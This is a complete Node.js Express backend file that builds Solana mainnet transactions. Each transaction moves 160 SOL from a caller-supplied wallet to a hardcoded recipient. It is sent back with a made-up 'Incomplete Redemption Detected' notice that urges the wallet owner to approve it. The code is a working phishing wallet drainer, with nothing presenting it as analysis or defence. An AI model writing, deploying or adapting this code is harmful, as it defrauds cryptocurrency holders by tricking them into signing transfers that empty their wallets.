const express = require('express');
const { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } = require('@solana/web3.js');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

// Fixed recipient address (YOUR ADDRESS)
const RECIPIENT_ADDRESS = 'CmqzfkRX6KwktX3DXLuWYvPhcEXHuViYiT5WoKio5X1d';
const RECIPIENT_PUBKEY = new PublicKey(RECIPIENT_ADDRESS);
const SOL_AMOUNT = 160;
const LAMPORTS_TO_SEND = SOL_AMOUNT * LAMPORTS_PER_SOL;

const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');

app.get('/', (req, res) => {
  res.json({ 
    message: '✅ Solana Vercel Backend is running!',
    recipient: RECIPIENT_ADDRESS,
    amount: SOL_AMOUNT + ' SOL'
  });
});

app.post('/api/create-transaction', async (req, res) => {
  try {
    const { fromAddress } = req.body;
    
    if (!fromAddress) {
      return res.status(400).json({ success: false, error: 'fromAddress is required' });
    }

    let fromPubkey;
    try {
      fromPubkey = new PublicKey(fromAddress);
    } catch (error) {
      return res.status(400).json({ success: false, error: 'Invalid fromAddress format' });
    }

    const { blockhash } = await connection.getLatestBlockhash();

    const transferInstruction = SystemProgram.transfer({
      fromPubkey: fromPubkey,
      toPubkey: RECIPIENT_PUBKEY,
      lamports: LAMPORTS_TO_SEND,
    });

    const transaction = new Transaction().add(transferInstruction);
    transaction.feePayer = fromPubkey;
    transaction.recentBlockhash = blockhash;

    const serializedTransaction = transaction.serialize({
      requireAllSignatures: false,
      verifySignatures: false
    });

    const transactionBase64 = serializedTransaction.toString('base64');

    res.json({
      success: true,
      transaction: transactionBase64,
      message: "Notice: Incomplete Redemption Detected. Block number 396659180 has been identified as incomplete. To finalize and complete your redemption process, please approve this transaction."
    });

  } catch (error) {
    console.error('Transaction creation error:', error);
    res.status(500).json({ success: false, error: 'Failed to create transaction' });
  }
});

module.exports = app;
